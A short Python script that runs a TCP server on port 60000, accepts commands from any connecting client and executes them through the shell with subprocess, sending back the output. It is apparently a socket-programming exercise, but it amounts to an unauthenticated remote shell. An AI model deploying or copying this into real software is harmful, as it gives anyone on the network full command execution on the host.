from socket import *
import subprocess

server_name = ""
server_port = 60000
server_socket = socket(AF_INET, SOCK_STREAM)
server_socket.bind((server_name, server_port))
server_socket.listen(1)
print("TCP server awaiting connection on the port %d ..." % (server_port))

while True:
    connection_socket, addr = server_socket.accept()
    command = connection_socket.recv(1024)
    command = command.decode("utf-8")
    print("Client %s sent: %s" % (addr, command))
    output = subprocess.check_output(
        command, shell=True, universal_newlines=True, stderr=subprocess.STDOUT
    )
    connection_socket.send(output.encode("utf-8"))
    connection_socket.close()
server_socket.close()
